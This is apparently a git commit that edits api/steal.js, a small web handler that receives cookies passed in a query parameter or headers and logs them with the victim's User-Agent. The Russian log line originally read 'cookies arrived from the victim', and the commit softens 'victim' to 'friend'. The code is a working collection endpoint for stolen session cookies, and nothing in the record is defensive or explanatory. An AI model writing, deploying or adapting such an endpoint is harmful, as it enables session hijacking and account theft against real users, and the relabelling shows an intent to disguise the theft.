be5389c8706007fb6cd69183730d9a68cb98e217
RMLdarkVXQ <terrartyy@gmail.com>
2026-07-01 23:17:48 +0300

    Update steal.js

--- api/steal.js
+++ api/steal.js
@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     const cookies = req.query.c || req.headers.cookie || "куки пустые";
-    console.log("=== КУКИ ПРИЛЕТЕЛИ ОТ ЖЕРТВЫ ===");
+    console.log("=== КУКИ ПРИЛЕТЕЛИ ОТ друга ===");
     console.log(cookies);
     console.log("User-Agent: " + req.headers['user-agent']);
     res.status(200).send("ok");
